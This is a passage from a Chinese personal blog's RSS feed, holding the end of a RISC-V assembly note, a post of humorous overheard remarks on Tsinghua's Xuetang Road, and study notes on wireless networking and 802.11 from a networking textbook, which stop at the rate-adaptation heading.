<p>详见<span class="mojikumi-line-start">《</span>The RISC-V Instruction Set Manual Volume I: Unprivileged ISA<span class="mojikumi-line-end">》</span>Chapter 25 RISC-V Assembly Programmer<span class="mojikumi-narrow-left">’</span>s Handbook<span class="mojikumi-line-end">。</span></p>
<section data-footnotes class="footnotes"><h2 class="sr-only" id="footnote-label">Footnotes</h2>
<ol>
<li id="user-content-fn-jalr-format">
<p><span class="mojikumi-line-start">《</span>The RISC-V Instruction Set Manual Volume I: Unprivileged ISA (20191213)<span class="mojikumi-line-end">》</span>2.5 Control Transfer Instructions <a href="#user-content-fnref-jalr-format" data-footnote-backref class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
<li id="user-content-fn-rvc">
<p><span class="mojikumi-line-start">《</span>The RISC-V Instruction Set Manual Volume I: Unprivileged ISA (20191213)<span class="mojikumi-line-end">》</span>1.5 Base Instruction-Length Encoding <a href="#user-content-fnref-rvc" data-footnote-backref class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
</ol>
</section>]]></content:encoded>
            <category domain="https://ouuan.moe/tag/cod">cod</category>
            <category domain="https://ouuan.moe/tag/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">学习笔记</category>
        </item>
        <item>
            <title><![CDATA[学堂路畔]]></title>
            <link>https://ouuan.moe/post/2023/10/xuetang-roadside</link>
            <guid>https://ouuan.moe/post/2023/10/xuetang-roadside</guid>
            <pubDate>Sun, 08 Oct 2023 12:24:35 GMT</pubDate>
            <description><![CDATA[<p>在学堂路畔<span class="mojikumi-line-end">，</span>与形形色色的路人擦肩而过<span class="mojikumi-line-end">，</span>总能偶然听到一些有趣的只言片语<span class="mojikumi-line-end">；</span>感觉可以记下来专门开一篇了<span class="mojikumi-line-start">（</span></p>
]]></description>
            <content:encoded><![CDATA[<p>在学堂路畔<span class="mojikumi-line-end">，</span>与形形色色的路人擦肩而过<span class="mojikumi-line-end">，</span>总能偶然听到一些有趣的只言片语<span class="mojikumi-line-end">；</span>感觉可以记下来专门开一篇了<span class="mojikumi-line-start">（</span></p>

<p><span class="mojikumi-line-start">（</span>其实也不只是学堂路<span class="mojikumi-line-end">，</span>只是大部分是<span class="mojikumi">。</span><span class="mojikumi-line-end">）</span></p>
<h2 id="言胜于行" class="heading"><a href="#言胜于行" class="heading-anchor" aria-label="章节： 言胜于行" tabindex="-1"></a><span>言胜于行</span></h2>
<blockquote>
<p>看那个<span class="mojikumi-line-end">，</span>言胜于行<span class="mojikumi-line-end">。</span></p>
<p>——<span class="mojikumi-line-start">“</span>行勝於言<span class="mojikumi-line-end">”</span>旁<span class="mojikumi-line-end">，</span>一位父亲对孩子说</p>
</blockquote>
<p><span class="mojikumi-line-start">（</span>怎么第一条就不是学堂路<span class="mojikumi-line-start">（</span></p>
<h2 id="华清大学" class="heading"><a href="#华清大学" class="heading-anchor" aria-label="章节： 华清大学" tabindex="-1"></a><span>华清大学</span></h2>
<blockquote>
<p>小孩<span class="mojikumi-line-end">：</span>华清大学是什么？</p>
<p>家长<span class="mojikumi-line-end">：</span>没有华清大学<span class="mojikumi-line-end">，</span>只有华清嘉园<span class="mojikumi-line-end">。</span></p>
</blockquote>
<h2 id="垃圾，但是华子" class="heading"><a href="#垃圾，但是华子" class="heading-anchor" aria-label="章节： 垃圾，但是华子" tabindex="-1"></a><span>垃圾<span class="mojikumi-line-end">，</span>但是华子</span></h2>
<blockquote>
<p>垃圾桶上怎么还要刻个<span class="mojikumi-line-start">“</span>清华<span class="mojikumi">”</span><span class="mojikumi-line-end">，</span>垃圾桶还怕被偷吗<span class="mojikumi-line-end">。</span></p>
<p>——一位小孩问家长</p>
</blockquote>
<p><span class="mojikumi-line-start">（</span>怎么全是小孩和家长<span class="mojikumi-line-start">（</span></p>
<h2 id="分期付款" class="heading"><a href="#分期付款" class="heading-anchor" aria-label="章节： 分期付款" tabindex="-1"></a><span>分期付款</span></h2>
<blockquote>
<p>A: 这辈子工作 25 年<span class="mojikumi-line-end">，</span>下辈子工作 25 年<span class="mojikumi-line-end">。</span></p>
<p>B: 真的能有下辈子吗<span class="mojikumi-line-start">（</span></p>
</blockquote>
<h2 id="后会有期" class="heading"><a href="#后会有期" class="heading-anchor" aria-label="章节： 后会有期" tabindex="-1"></a><span>后会有期</span></h2>
<blockquote>
<p>说不定毕业后北大就要我了<span class="mojikumi-line-end">。</span></p>
</blockquote>
<h2 id="从娃娃抓起" class="heading"><a href="#从娃娃抓起" class="heading-anchor" aria-label="章节： 从娃娃抓起" tabindex="-1"></a><span>从娃娃抓起</span></h2>
<blockquote>
<p>人家的母语是 C++！</p>
</blockquote>
<p>是谭院士<sup><a href="#user-content-fn-twd2" id="user-content-fnref-twd2" data-footnote-ref aria-describedby="footnote-label">1</a></sup>的投稿<span class="mojikumi-line-start">（</span><span class="mojikumi-line-end">，</span>本来没计划接收投稿<span class="mojikumi-line-end">，</span>但想投的话确实可以<span class="mojikumi-line-start">（</span></p>
<h2 id="基础地形学" class="heading"><a href="#基础地形学" class="heading-anchor" aria-label="章节： 基础地形学" tabindex="-1"></a><span>基础地形学</span></h2>
<blockquote>
<p>Let<span class="mojikumi-narrow-left">’</span>s go topography!</p>
<p>——邀请我室友一起去上基础拓扑学的同学</p>
</blockquote>
<h2 id="清华学生的实力" class="heading"><a href="#清华学生的实力" class="heading-anchor" aria-label="章节： 清华学生的实力" tabindex="-1"></a><span>清华学生的实力</span></h2>
<blockquote>
<p>我已经初步感受到清华学生的实力了<span class="mojikumi-line-end">，</span>真 nm 离谱<span class="mojikumi-line-end">。</span></p>
<p>——体测结束后的路上</p>
</blockquote>
<h2 id="一次元游戏" class="heading"><a href="#一次元游戏" class="heading-anchor" aria-label="章节： 一次元游戏" tabindex="-1"></a><span>一次元游戏</span></h2>
<blockquote>
<p>我终于知道我们班为什么这么多人玩原神了<span class="mojikumi-line-end">。</span>原神是二次元游戏<span class="mojikumi-line-end">，</span>我们是二字班<span class="mojikumi-line-end">，</span>很合理吧<span class="mojikumi-line-end">。</span></p>
</blockquote>
<h2 id="十以内的加减法" class="heading"><a href="#十以内的加减法" class="heading-anchor" aria-label="章节： 十以内的加减法" tabindex="-1"></a><span>十以内的加减法</span></h2>
<blockquote>
<p>比如说你教小学生十以内的加减法<span class="mojikumi-line-end">，</span>它很简单<span class="mojikumi-line-end">，</span>但就是教不会<span class="mojikumi-line-end">，</span>你就会很愤怒<span class="mojikumi-line-end">。</span></p>
</blockquote>
<p>听到这个突然想到<span class="mojikumi-line-end">，</span>十以内的加减法如果要快速计算基本上是得死记硬背<span class="mojikumi-line-end">，</span>实际上是非常困难的<span class="mojikumi-line-start">（</span><span class="mojikumi-line-end">。</span>当年我妈带我去学了半年还是多久的珠心算<span class="mojikumi-line-start">（</span>好像是上小学前但记不清了<span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>我当时完全没理解算盘对心算有什么作用<span class="mojikumi-line-end">，</span>主要是学会了十以内的加减法<span class="mojikumi-line-end">。</span>还有印象当时在学校观察到不少同学都是掰着指头算<span class="mojikumi-line-end">，</span>感觉学会不掰指头算确实是很困难而有用的<span class="mojikumi-line-start">（</span></p>
<h2 id="指鸦为雁" class="heading"><a href="#指鸦为雁" class="heading-anchor" aria-label="章节： 指鸦为雁" tabindex="-1"></a><span>指鸦为雁</span></h2>
<blockquote>
<p>A: 你们学校里还能看到大雁南飞啊<span class="mojikumi-line-end">。</span></p>
<p>B: 那是乌鸦<span class="mojikumi-line-end">。</span></p>
</blockquote>
<h2 id="吾辈楷模" class="heading"><a href="#吾辈楷模" class="heading-anchor" aria-label="章节： 吾辈楷模" tabindex="-1"></a><span><s>吾辈楷模</s></span></h2>
<blockquote>
<p>A: 最近那个女生没再找你玩吗？</p>
<p>B: 微信上找了<span class="mojikumi-line-end">，</span>但我都说做实验推掉了<span class="mojikumi-line-end">，</span>我要在寝室打游戏<span class="mojikumi-line-end">。</span></p>
</blockquote>
<h2 id="软工作业" class="heading"><a href="#软工作业" class="heading-anchor" aria-label="章节： 软工作业" tabindex="-1"></a><span>软工作业</span></h2>
<blockquote>
<p>就只有那个软工作业<span class="mojikumi-line-end">，</span>真 tm</p>
</blockquote>
<h2 id="洄游节" class="heading"><a href="#洄游节" class="heading-anchor" aria-label="章节： 洄游节" tabindex="-1"></a><span>洄游节</span></h2>
<blockquote>
<p>别从游了<span class="mojikumi-line-end">，</span>我觉得方向不对<span class="mojikumi-line-end">，</span>现在想掉头<span class="mojikumi-line-end">。</span></p>
</blockquote>
<h2 id="薯条汉堡" class="heading"><a href="#薯条汉堡" class="heading-anchor" aria-label="章节： 薯条汉堡" tabindex="-1"></a><span>薯条汉堡</span></h2>
<blockquote>
<p>A: 你是嫌弃我这个薯条汉堡的吃法吗？</p>
<p>B: 不嫌弃啊<span class="mojikumi-line-end">。</span></p>
<p>A: 把薯条插到汉堡里……<span class="mojikumi-line-start">（</span>没听清<span class="mojikumi-line-end">）</span></p>
</blockquote>
<h2 id="观光电梯" class="heading"><a href="#观光电梯" class="heading-anchor" aria-label="章节： 观光电梯" tabindex="-1"></a><span>观光电梯</span></h2>
<blockquote>
<p>——这还是个观光电梯<span class="mojikumi-line-end">。</span></p>
<p>——这有什么可以观光的<span class="mojikumi-line-end">。</span></p>
<p>——看<span class="mojikumi-line-end">，</span>这条路是学堂路<span class="mojikumi-line-end">。</span></p>
</blockquote>
<p>最学堂路畔的一集<span class="mojikumi-line-start">（</span></p>
<section data-footnotes class="footnotes"><h2 class="sr-only" id="footnote-label">Footnotes</h2>
<ol>
<li id="user-content-fn-twd2">
<p><a href="https://twd2.me/whoami">https<wbr>://<wbr>twd2<wbr>.<wbr>me<wbr>/<wbr>whoami</a> <a href="#user-content-fnref-twd2" data-footnote-backref class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
</ol>
</section>]]></content:encoded>
            <category domain="https://ouuan.moe/tag/%E9%9A%8F%E8%AE%B0">随记</category>
        </item>
        <item>
            <title><![CDATA[CNATDA 第七章学习笔记]]></title>
            <link>https://ouuan.moe/post/2023/09/cnatda-7</link>
            <guid>https://ouuan.moe/post/2023/09/cnatda-7</guid>
            <pubDate>Sun, 08 Oct 2023 09:32:15 GMT</pubDate>
            <description><![CDATA[
<p><span class="mojikumi-line-start">《</span>Computer Networking: A Top-Down Approach (8th Edition)<span class="mojikumi-line-end">》</span>第七章 <span class="mojikumi">“</span>Wireless and Mobile Networks<span class="mojikumi">”</span> 的学习笔记<span class="mojikumi-line-end">。</span></p>
]]></description>
            <content:encoded><![CDATA[
<p><span class="mojikumi-line-start">《</span>Computer Networking: A Top-Down Approach (8th Edition)<span class="mojikumi-line-end">》</span>第七章 <span class="mojikumi">“</span>Wireless and Mobile Networks<span class="mojikumi">”</span> 的学习笔记<span class="mojikumi-line-end">。</span></p>

<h2 id="introduction" class="heading"><a href="#introduction" class="heading-anchor" aria-label="章节： Introduction" tabindex="-1"></a><span>Introduction</span></h2>
<p><span class="mojikumi-line-start">“</span>wireless<span class="mojikumi">”</span> 和 <span class="mojikumi">“</span>mobile<span class="mojikumi">”</span> 往往是密不可分的<span class="mojikumi-line-end">，</span>但它们实际上面临着不同的挑战<span class="mojikumi-line-end">，</span>需要不同的解决方案<span class="mojikumi-line-end">。</span></p>
<p>wireless network 一般包含 wireless host<span class="mojikumi-line-end">、</span>wireless link 和 base station<span class="mojikumi-line-end">，</span>但不是所有 wireless network 都有 base station<span class="mojikumi-line-end">。</span></p>
<p>根据 wireless hop 的次数<span class="mojikumi-line-end">、</span>是否有 base station (infrastructure)<span class="mojikumi-line-end">，</span>wireless network 可以大致分为四种<span class="mojikumi-line-end">：</span></p>
<ul>
<li>single-hop, infrastructure-based: 大部分 wireless network<span class="mojikumi-line-end">，</span>例如 802.11 和 4G LTE</li>
<li>single-hop, infrastructure-less: 例如 Bluetooth</li>
<li>multi-hop, infrastructure-based: 例如 wireless mesh network</li>
<li>multi-hop, infrastructure-less: 例如 mobile ad hoc network (MANET)<span class="mojikumi-line-end">、</span>vehicular ad hoc network (VANET)</li>
</ul>
<h2 id="wireless-links-and-network-characteristics" class="heading"><a href="#wireless-links-and-network-characteristics" class="heading-anchor" aria-label="章节： Wireless Links and Network Characteristics" tabindex="-1"></a><span>Wireless Links and Network Characteristics</span></h2>
<p>wireless network 面临着几个主要问题<span class="mojikumi-line-end">：</span></p>
<ul>
<li>信号衰减<span class="mojikumi-line-end">：</span>长距离传输<span class="mojikumi-line-end">、</span>穿越障碍</li>
<li>信号干扰<span class="mojikumi-line-end">：</span>其他同频段信号<span class="mojikumi-line-end">、</span>环境噪音</li>
<li>multipath propagation<span class="mojikumi-line-end">：</span>同一信号的多个部分从 sender 到 receiver 可能会走不同的路径</li>
</ul>
<p>总之<span class="mojikumi-line-end">，</span>wireless network 通常有更多 bit error<span class="mojikumi-line-end">，</span>所以往往除了 wired network 也会使用的 CRC error detection codes<span class="mojikumi-line-end">，</span>还会使用 link-layer reliable-data-transfer protocol<span class="mojikumi-line-end">。</span></p>
<p><i>signal-to-noise ratio</i> (SNR) 是接收到的信号强度与噪音之比<span class="mojikumi-line-end">，</span><i>bit error rate</i> (BER) 是 bit error 发生的概率<span class="mojikumi-line-end">。</span></p>
<p>wireless network 通过 modulation scheme 来决定如何 encoding 和 transmission<span class="mojikumi-line-end">。</span>对于同一个 modulation scheme<span class="mojikumi-line-end">，</span>SNR 越高 BER 越低<span class="mojikumi-line-end">；</span>对于同样的 SNR<span class="mojikumi-line-end">，</span>transmission rate 越高的 modulation scheme BER 越高<span class="mojikumi-line-end">。</span>所以<span class="mojikumi-line-end">，</span>往往会根据实际的 channel condition 动态选用 modulation scheme<span class="mojikumi-line-start">（</span>例如在 BER 满足一定限制的情况下尽可能提高 transmission rate<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
<p>wireless network 中的 multiple access 也更加复杂<span class="mojikumi-line-end">，</span>例如<span class="mojikumi-line-end">，</span>A 和 C 分别能传输信号到 B<span class="mojikumi-line-end">，</span>但因为障碍物或距离等原因<span class="mojikumi-line-end">，</span>A 和 C 接收不到彼此发送的信号<span class="mojikumi-line-end">，</span>这可能导致 undetectable collision<span class="mojikumi-line-end">。</span></p>
<h2 id="cdma" class="heading"><a href="#cdma" class="heading-anchor" aria-label="章节： CDMA" tabindex="-1"></a><span>CDMA</span></h2>
<p>CDMA (code division multiple access) 是一种常用于 wireless network 的 multiple access protocol<span class="mojikumi-line-end">，</span>属于 <a href="/post/2023/07/cnatda-6#channel-partitioning-protocols">channel partitioning protocol</a><span class="mojikumi-line-end">。</span></p>
<p>在 CDMA 中<span class="mojikumi-line-end">，</span>每个装有 1 bit 的 time slot 会被再分为多个 mini-slot<span class="mojikumi-line-end">，</span>sender 将每个 slot 内的 data<span class="mojikumi-line-start">（</span>mini-slot 全 0 / 全 1<span class="mojikumi-line-end">）</span>异或上一个 code<span class="mojikumi-line-end">，</span>理想状态下<span class="mojikumi-line-end">，</span>receiver 再异或上这个 code 就可以得到 data<span class="mojikumi-line-end">。</span>实际上<span class="mojikumi-line-end">，</span>会有其他信号产生干扰<span class="mojikumi-line-end">，</span>而合适地选取 code 可以在有干扰的情况下依然能够读取出 data<span class="mojikumi-line-end">。</span>这相当于是在 code space 而非 time / frequency 上进行 channel partitioning<span class="mojikumi-line-end">。</span></p>
<p><span class="mojikumi-line-start">（</span>书中没有说明具体细节<span class="mojikumi-line-end">，</span>例如如何选取 code<span class="mojikumi-line-end">，</span>如何处理不同 sender 的信号强度不同<span class="mojikumi">。</span><span class="mojikumi-line-end">）</span></p>
<h2 id="wi-fi-802-11-wireless-lans" class="heading"><a href="#wi-fi-802-11-wireless-lans" class="heading-anchor" aria-label="章节： Wi-Fi: 802.11 Wireless LANs" tabindex="-1"></a><span>Wi-Fi: 802.11 Wireless LANs</span></h2>
<p>Wi-Fi 的全称为 <span class="mojikumi">“</span>IEEE 802.11 wireless LAN<span class="mojikumi">”</span><span class="mojikumi-line-end">，</span>有 802.11b/g/n/ac/ax/af/ah 等版本<span class="mojikumi-line-end">，</span>不同版本有不同的最大传输速率<span class="mojikumi-line-end">、</span>传输距离以及使用的频段<span class="mojikumi-line-end">。</span></p>
<h3 id="the-802-11-wireless-lan-architecture" class="heading"><a href="#the-802-11-wireless-lan-architecture" class="heading-anchor" aria-label="章节： The 802.11 Wireless LAN Architecture" tabindex="-1"></a><span>The 802.11 Wireless LAN Architecture</span></h3>
<p>802.11 architecture 的 building block 是 <i>basic service set</i> (BSS)<span class="mojikumi-line-end">，</span>每个 BSS 包含一个被称作 <i>access point</i> (AP) 的 base station 以及连接到 AP 的若干 wireless station<span class="mojikumi-line-start">（</span>即 host<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
<p>802.11 可以通过 AP 连接为 infrastructure wireless LAN<span class="mojikumi-line-end">，</span>也可以没有 AP 而只由几个 host 互相连接成 ad hoc network<span class="mojikumi-line-start">（</span>不对外连接到 Internet<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span>本书只讨论 infrastructure wireless LAN<span class="mojikumi-line-end">。</span></p>
<p>每个 AP 有一个 <i>service set identifier</i> (SSID)<span class="mojikumi-line-end">，</span>即 Wi-Fi 的名称<span class="mojikumi-line-end">。</span>可以为 AP 设置 channel number<span class="mojikumi-line-end">，</span>2.4GHz 频段共有 11 个 channel number<span class="mojikumi-line-end">，</span>但相差不到 5 的 channel 会相交<span class="mojikumi-line-end">，</span>彼此不相交的 channel 最多只能有 3 个<span class="mojikumi-line-start">（</span>1<span class="mojikumi-line-end">、</span>6<span class="mojikumi-line-end">、</span>11<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
<p>AP 会周期性地广播 <i>beacon frame</i> 来告诉 wireless device 自己的存在<span class="mojikumi-line-end">，</span>wireless device 可以监听 beacon frame 来进行 <i>passive scanning</i><span class="mojikumi-line-end">。</span>除此之外<span class="mojikumi-line-end">，</span>也可以主动发送 probe frame 来进行 <i>active scanning</i><span class="mojikumi-line-end">。</span></p>
<p>找到 AP 后<span class="mojikumi-line-end">，</span>wireless device 需要在可用的 AP 中选择一个<span class="mojikumi-line-start">（</span>802.11 standard 中没有规定选择 AP 的算法<span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>发送 association request<span class="mojikumi-line-end">，</span>AP 返回 association response<span class="mojikumi-line-end">，</span>就建立了连接<span class="mojikumi-line-end">。</span></p>
<h3 id="the-802-11-mac-protocol" class="heading"><a href="#the-802-11-mac-protocol" class="heading-anchor" aria-label="章节： The 802.11 MAC Protocol" tabindex="-1"></a><span>The 802.11 MAC Protocol</span></h3>
<h4 id="csmaca" class="heading"><a href="#csmaca" class="heading-anchor" aria-label="章节： CSMA/CA" tabindex="-1"></a><span>CSMA/CA</span></h4>
<p>802.11 使用的 <a href="/post/2023/07/cnatda-6#multiple-access-links-and-protocols">MAC protocol</a> 是称作 <i>CSMA with collision avoidance</i> (CSMA/CA) 的 <a href="/post/2023/07/cnatda-6#random-access-protocols">random access protocol</a><span class="mojikumi-line-end">，</span>和 Ethernet 使用的 <a href="/post/2023/07/cnatda-6#csmacd">CSMA/CD</a> 类似<span class="mojikumi-line-end">，</span>但又有很大不同<span class="mojikumi-line-end">：</span></p>
<ul>
<li>CSMA/CA 是 <span class="mojikumi">“</span>collision avoidance<span class="mojikumi">”</span> 而非 CSMA/CD 的 <span class="mojikumi">“</span>collision detection<span class="mojikumi">”</span><span class="mojikumi-line-end">，</span>这意味着它不是在检测 collision 时中断传输<span class="mojikumi-line-end">，</span>而是不进行检测<span class="mojikumi-line-end">，</span>通过其他机制尽量避免 collision<span class="mojikumi-line-end">。</span>这是因为 wireless network 中很难进行 collision detection<span class="mojikumi-line-end">：</span>
<ul>
<li><a href="#wireless-links-and-network-characteristics">前文</a>中提到过<span class="mojikumi-line-end">，</span>wireless network 中可能存在 undetectable collision<span class="mojikumi-line-end">；</span></li>
<li>collision detection 需要在发送的同时接收信号<span class="mojikumi-line-end">，</span>而无线信号在发送端的强度会远高于接收端的强度<span class="mojikumi-line-end">，</span>这也加大了 collision detection 的难度<span class="mojikumi-line-end">。</span></li>
</ul>
</li>
<li>802.11 引入了 link-layer <a href="/post/2023/06/cnatda-3#principles-of-reliable-data-transfer">reliable-data-transfer</a><span class="mojikumi-line-end">。</span></li>
</ul>
<p>其完整流程为<span class="mojikumi-line-end">：</span></p>
<ol>
<li>等待一小段时间<span class="mojikumi-line-start">（</span>distributed inter-frame space, DIFS) 来看 channel 是否 idle<span class="mojikumi-line-end">。</span></li>
<li>如果 channel buzy<span class="mojikumi-line-end">，</span>进入 binary exponential backoff<span class="mojikumi-line-start">（</span>只在 channel idle 时 countdown<span class="mojikumi-line-end">，</span>channel buzy 则不计入等待时间<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></li>
<li>经历了足够长的 channel idle 后<span class="mojikumi-line-end">，</span>发送整个 frame<span class="mojikumi-line-start">（</span>不检测 collision<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></li>
<li>AP 接收到 frame 后<span class="mojikumi-line-end">，</span>等待一小段时间<span class="mojikumi-line-start">（</span>short inter-frame space, SIFS<span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>然后发送 ACK<span class="mojikumi-line-end">。</span></li>
<li>如果 sender 接收到了 ACK<span class="mojikumi-line-end">，</span>则结束或继续发送下一个 frame<span class="mojikumi-line-end">；</span>否则进入 binary exponential backoff<span class="mojikumi-line-end">，</span>进行 retransmission<span class="mojikumi-line-end">。</span></li>
</ol>
<p>其中<span class="mojikumi-line-end">，</span>检测到 channel buzy 时直接进入 backoff<span class="mojikumi-line-end">，</span>是为了避免 channel 变为 idle 时多个 sender 同时发送而产生 collision<span class="mojikumi-line-end">。</span>这与 CSMA/CD 不同<span class="mojikumi-line-end">，</span>因为如果有 collision detection 的话<span class="mojikumi-line-end">，</span>即使发生了这样的 collision 也代价不大<span class="mojikumi-line-end">，</span>就无需通过 backoff 来避免<span class="mojikumi-line-end">。</span></p>
<h4 id="rtscts" class="heading"><a href="#rtscts" class="heading-anchor" aria-label="章节： RTS/CTS" tabindex="-1"></a><span>RTS/CTS</span></h4>
<p>wireless network 中不仅 collision detection 非常困难<span class="mojikumi-line-end">，</span>carrier sense 也比较困难<span class="mojikumi-line-end">，</span>光靠上面这些机制还是很可能出现 collision<span class="mojikumi-line-end">，</span>所以 802.11 还提供了另一种可选的机制<span class="mojikumi-line-end">：</span>使用 <i>request to send</i> (RTS) frame 和 <i>clear to send</i> (CTS) frame 来显式地预留出通信权<span class="mojikumi-line-end">：</span></p>
<ol>
<li>sender 发送 RTS<span class="mojikumi-line-end">，</span>告诉 AP 需要预留出的时长<span class="mojikumi-line-start">（</span>传输 data 和 ACK 的用时<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></li>
<li>AP 发送 CTS<span class="mojikumi-line-end">，</span>告诉 sender 可以发送<span class="mojikumi-line-end">，</span>以及告诉其他 station 一段时间内不要发送<span class="mojikumi-line-end">。</span></li>
<li>sender 发送 data<span class="mojikumi-line-end">。</span></li>
<li>AP 发送 ACK<span class="mojikumi-line-end">，</span>除了普通的 ACK<span class="mojikumi-line-end">，</span>也是告诉其他 station 可以发送了<span class="mojikumi-line-end">。</span></li>
</ol>
<p>使用 RTS/CTS 可以保证 data 和 ACK 的传输不会出现 collision<span class="mojikumi-line-end">，</span>而 RTS/CTS frame 自身非常短<span class="mojikumi-line-end">，</span>如果产生 collision 代价是较小的<span class="mojikumi-line-end">。</span>然而<span class="mojikumi-line-end">，</span>RTS/CTS 自身会消耗资源<span class="mojikumi-line-end">、</span>产生延时<span class="mojikumi-line-end">，</span>所以一般只有在 data 较大时才会使用<span class="mojikumi-line-end">，</span>wireless station 一般会设置一个发送 RTS 的 frame length threshold<span class="mojikumi-line-end">，</span>很多时候这个 threshold 比 maximum frame length 还大<span class="mojikumi-line-end">，</span>实际上就是禁用了 RTS<span class="mojikumi-line-end">。</span></p>
<h4 id="use-802-11-as-point-to-point-link" class="heading"><a href="#use-802-11-as-point-to-point-link" class="heading-anchor" aria-label="章节： Use 802.11 as Point-to-Point Link" tabindex="-1"></a><span>Use 802.11 as Point-to-Point Link</span></h4>
<p>上面说的是常见的 802.11 对 multiple access 的处理<span class="mojikumi-line-end">，</span>除此之外<span class="mojikumi-line-end">，</span>802.11 也可以通过 directional antenna 作为 point-to-point link 使用<span class="mojikumi-line-end">。</span></p>
<h3 id="the-ieee-802-11-frame" class="heading"><a href="#the-ieee-802-11-frame" class="heading-anchor" aria-label="章节： The IEEE 802.11 Frame" tabindex="-1"></a><span>The IEEE 802.11 Frame</span></h3>
<p>802.11 frame 的结构如下图所示<span class="mojikumi-line-end">：</span><sup><a href="#user-content-fn-fig-7.13" id="user-content-fnref-fig-7.13" data-footnote-ref aria-describedby="footnote-label">1</a></sup></p>
<ul>
<li>
<p>type<span class="mojikumi-line-end">、</span>subtype<span class="mojikumi-line-end">：</span>这决定了 association<span class="mojikumi-line-end">、</span>RTS<span class="mojikumi-line-end">、</span>CTS<span class="mojikumi-line-end">、</span>ACK<span class="mojikumi-line-end">、</span>data 等 frame 类型<span class="mojikumi-line-end">。</span></p>
</li>
<li>
<p>duration: 这是 RTS/CTS<span class="mojikumi-line-start">（</span>预留一段时长<span class="mojikumi-line-end">）</span>所需的<span class="mojikumi-line-end">。</span></p>
</li>
<li>
<p>address: 由于 AP 起到中介的作用<span class="mojikumi-line-end">，</span>在 infrastructure wireless LAN 中 frame 需要包含三个 address<span class="mojikumi-line-start">（</span>在 ad hoc mode 中需要四个<span class="mojikumi-line-end">，</span>此处不讨论<span class="mojikumi">）</span><span class="mojikumi-line-end">：</span></p>
<ul>
<li>前两个是 802.11 收发双方<span class="mojikumi-line-start">（</span>station 和 AP<span class="mojikumi-line-end">）</span>的 MAC address<span class="mojikumi-line-end">：</span>这是 802.11 通信所需的<span class="mojikumi-line-end">。</span></li>
<li>第三个是 AP 连接到的 router interface 的 MAC address<span class="mojikumi-line-end">：</span>AP 工作在 link layer<span class="mojikumi-line-end">，</span>router 感知不到 AP 的存在<span class="mojikumi-line-end">；</span>在 AP 向 station 发送时<span class="mojikumi-line-end">，</span>station 可以从 address 3 得到 router 的 MAC address<span class="mojikumi-line-end">；</span>在 station 向 AP 发送时<span class="mojikumi-line-end">，</span>AP 可以从 address 3 知道 Ethernet frame 需要发给谁<span class="mojikumi-line-end">。</span>总之<span class="mojikumi-line-end">，</span>address 3 是 Ethernet 通信所需的<span class="mojikumi-line-end">。</span></li>
</ul>
<p>不同场合下每个 address 分别代表什么是不同的<span class="mojikumi-line-end">，</span>这由 frame control 中的 <span class="mojikumi">“</span>to AP<span class="mojikumi">”</span> 和 <span class="mojikumi">“</span>from AP<span class="mojikumi">”</span> 决定<span class="mojikumi-line-end">。</span></p>
</li>
<li>
<p>sequence number: 这是 link-layer reliable-data-transfer 所需的<span class="mojikumi-line-end">。</span></p>
</li>
<li>
<p>payload: 802.11 允许 2312 bytes 的 payload<span class="mojikumi-line-end">，</span>但由于 Ethernet 的限制<span class="mojikumi-line-end">，</span>一般不会超过 1500<span class="mojikumi-line-end">。</span></p>
</li>
</ul>
<p><picture><source type="image/webp" srcset="/assets/cnatda-fig-7.13.5949ac2a.webp"><img srcset="/assets/cnatda-fig-7.13.7c70fcfe.png" loading="lazy" src="/assets/cnatda-fig-7.13.7c70fcfe.png" width="1006" height="307" alt="The 802.11 frame"></picture></p>
<h3 id="mobility-in-the-same-ip-subnet" class="heading"><a href="#mobility-in-the-same-ip-subnet" class="heading-anchor" aria-label="章节： Mobility in the Same IP Subnet" tabindex="-1"></a><span>Mobility in the Same IP Subnet</span></h3>
<p>当 host 从一个 BSS 移动到另一个 BSS 时<span class="mojikumi-line-end">，</span>如果两个 BSS 处于同一个 IP subnet 中<span class="mojikumi-line-end">，</span>mobility issue 就比较容易解决<span class="mojikumi-line-end">：</span>直接保持 IP address 不变即可<span class="mojikumi-line-end">。</span>而如果两个 AP 由 <a href="/post/2023/07/cnatda-6#link-layer-switches">switch</a> 连接<span class="mojikumi-line-end">，</span>还需要处理 switch interface 改变的问题<span class="mojikumi-line-end">，</span>由于 switch 的 self-learning<span class="mojikumi-line-end">，</span>一个处理方式是在和新的 AP 建立 association 后立刻发送一个 broadcast Ethernet frame 来告诉 switch 换了一个 interface<span class="mojikumi-line-end">。</span></p>
<p>如果使用 <a href="/post/2023/07/cnatda-6#virtual-local-area-networks-vlans">VLAN</a><span class="mojikumi-line-end">，</span>可以将很多<span class="mojikumi-line-start">（</span>地理位置不同的<span class="mojikumi-line-end">）</span>AP 放在同一个 IP subnet 中<span class="mojikumi-line-end">，</span>从而较为轻松地解决 mobility issue<span class="mojikumi-line-end">。</span></p>
<h3 id="advanced-features-in-802-11" class="heading"><a href="#advanced-features-in-802-11" class="heading-anchor" aria-label="章节： Advanced Features in 802.11" tabindex="-1"></a><span>Advanced Features in 802.11</span></h3>
<h4 id="802-11-rate-adaptation" class="heading"><a href="#802-11-rate-adaptation" class="heading-anchor" aria-label="章节： 802.11 Rate Adaptation" tabindex="-1"></a><span>802.11 Rate Adaptation</span></h4>
